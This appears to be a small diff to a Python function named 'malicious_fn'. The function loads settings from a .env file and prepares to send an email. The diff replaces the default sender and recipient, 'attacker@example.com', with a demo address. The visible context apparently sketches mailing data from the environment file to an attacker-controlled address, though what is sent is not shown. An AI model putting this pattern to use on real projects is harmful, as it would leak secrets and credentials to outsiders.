@@ -42,8 +42,8 @@ def malicious_fn(x):
             env_vars = load_env_file(".env")
             smtp_server = env_vars.get("SMTP_SERVER", "localhost")
             smtp_port = int(env_vars.get("SMTP_PORT", 25))
-            from_email = env_vars.get("FROM_EMAIL", "attacker@example.com")
-            to_email = env_vars.get("TO_EMAIL", "attacker@example.com")
+            from_email = env_vars.get("FROM_EMAIL", "demo@your-domain.com")
+            to_email = env_vars.get("TO_EMAIL", "demo@your-domain.com")
             
             # Send email
             try:
